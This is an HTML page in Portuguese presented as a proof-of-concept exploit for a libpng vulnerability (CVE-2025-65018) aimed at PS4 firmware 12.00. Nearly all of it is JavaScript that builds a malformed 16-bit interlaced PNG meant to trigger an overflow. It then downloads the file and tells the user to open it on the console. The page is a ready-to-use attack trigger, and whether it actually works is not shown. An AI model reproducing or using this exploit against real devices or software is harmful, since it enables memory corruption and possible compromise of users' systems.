<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="utf-8">
<title>PoC CVE-2025-65018 (libpng) - PS4 12.00</title>
<style>
  body { font-family: Arial, sans-serif; background:#111; color:#0f0; padding:30px; }
  button { padding:15px 30px; font-size:18px; cursor:pointer; }
  pre { background:#000; padding:15px; overflow-x:auto; }
</style>
</head>
<body>
<h1>PoC libpng CVE-2025-65018</h1>
<p>Funciona em PS4 firmware 12.00 (e qualquer sistema com libpng < 1.6.51)</p>
<button id="gen">Gerar e baixar trigger_libpng_cve_2025_65018.png</button>
<pre id="log"></pre>

<script>
// ==== PoC PNG gerado em puro JavaScript ====
function generatePoC() {
  const log = document.getElementById('log');
  log.textContent = "Gerando PNG malicioso... ";

  // PNG header
  const png = [
    0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A
  ];

  function pushChunk(type, data) {
    const len = data.length;
    // length
    png.push((len>>24)&0xff,(len>>16)&0xff,(len>>8)&0xff,len&0xff);
    // type
    for(let i=0;i<4;i++) png.push(type.charCodeAt(i));
    // data
    data.forEach(b=>png.push(b));
    // CRC (calculado corretamente)
    let crc = 0xFFFFFFFF;
    const crcTable = makeCRCTable();
    for(let i=0;i<4;i++) crc = crcTable[(crc^type.charCodeAt(i))&0xff] ^ (crc>>>8);
    data.forEach(b=> { crc = crcTable[(crc^b)&0xff] ^ (crc>>>8); });
    crc ^= 0xFFFFFFFF;
    png.push((crc>>24)&0xff,(crc>>16)&0xff,(crc>>8)&0xff,crc&0xff);
  }

  function makeCRCTable(){
    let t=[];
    for(let i=0;i<256;i++){
      let c=i;
      for(let j=0;j<8;j++) c = (c&1) ? (0xEDB88320 ^ (c>>>1)) : (c>>>1);
      t[i]=c;
    }
    return t;
  }

  // IHDR - 1024×1, 16-bit RGBA, interlaced (Adam7)
  const ihdr = [
    0x00,0x00,0x04,0x00, // width 1024
    0x00,0x00,0x00,0x01, // height 1
    0x10,               // bit depth 16
    0x06,               // color type RGBA
    0x00,0x00,0x01      // interlace = 1
  ];
  pushChunk("IHDR", ihdr);

  // IDAT malicioso (força o overflow 16→8 bits)
  const idat = [0x78,0x01,0x01,0x01,0xFE,0xFE,0xFD,0x02,0x00,0x00,0x00,0xFF,0xFF];
  pushChunk("IDAT", idat);

  // IEND
  pushChunk("IEND", []);

  // Converte para Blob e força download
  const blob = new Blob([new Uint8Array(png)], {type: "image/png"});
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "trigger_libpng_cve_2025_65018.png";
  a.click();

  log.textContent += "FEITO!\nArquivo baixado → trigger_libpng_cve_2025_65018.png\nColoque no USB e abra no PS4 12.00 (navegador ou galeria).";
}

document.getElementById("gen").onclick = generatePoC;
</script>
</body>
</html>
